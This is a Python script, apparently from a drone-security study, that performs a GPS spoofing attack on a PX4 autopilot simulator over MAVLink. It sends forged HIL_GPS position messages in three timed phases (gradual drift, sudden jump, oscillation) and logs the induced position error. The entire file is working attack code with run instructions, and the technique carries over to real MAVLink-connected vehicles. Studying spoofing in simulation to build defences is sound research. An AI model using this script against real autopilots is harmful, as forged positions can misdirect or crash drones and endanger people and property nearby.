#!/usr/bin/env python3
"""
Direct GPS Spoofing Attack via MAVLink (no ROS required)
"""
from pymavlink import mavutil
import time
import math

class DirectGPSSpoofingAttack:
    def __init__(self):
        # Connect directly to PX4 SITL
        self.connection = mavutil.mavlink_connection('udp:127.0.0.1:14540')
        print("🔗 Connected to PX4 SITL")
        
    def run_attack(self):
        base_lat = 47397742  # Latitude * 1e7 (Zurich)
        base_lon = 8545594   # Longitude * 1e7
        
        print("🚨 Starting GPS Spoofing Attack")
        print("Phase 1: Gradual Drift -> Phase 2: Sudden Jump -> Phase 3: Oscillation")
        
        for t in range(90):  # 90 second attack
            # Attack phases from your methodology
            if t < 30:
                drift = t * 5  # Gradual drift
                phase = "Gradual Drift"
            elif t < 60:
                drift = 150 + (t-30) * 10  # Sudden jump
                phase = "Sudden Jump"  
            else:
                drift = 450 + int(50 * math.sin((t-60) * 0.4))  # Oscillation
                phase = "Oscillation"
            
            # Send spoofed GPS via HIL_GPS
            self.connection.mav.hil_gps_send(
                int(time.time() * 1000000),  # timestamp (microseconds)
                3,  # fix_type (3D GPS fix)
                base_lat + drift,  # lat
                base_lon + drift,  # lon
                584000,  # alt (584m in mm)
                100,    # eph (GPS HDOP)
                100,    # epv (GPS VDOP) 
                250,    # vel (GPS ground speed cm/s)
                0,      # vn (GPS velocity north cm/s)
                0,      # ve (GPS velocity east cm/s)
                0,      # vd (GPS velocity down cm/s)
                180,    # cog (course over ground)
                8       # satellites_visible
            )
            
            error_meters = drift * 0.111  # Rough conversion for display
            print(f"⚡ T={t:2d}s | {phase:15s} | Error: ~{error_meters:.0f}m")
            time.sleep(1)
        
        print("✅ GPS spoofing attack completed!")

if __name__ == '__main__':
    # Install dependency first: pip3 install pymavlink
    spoofer = DirectGPSSpoofingAttack()
    spoofer.run_attack()

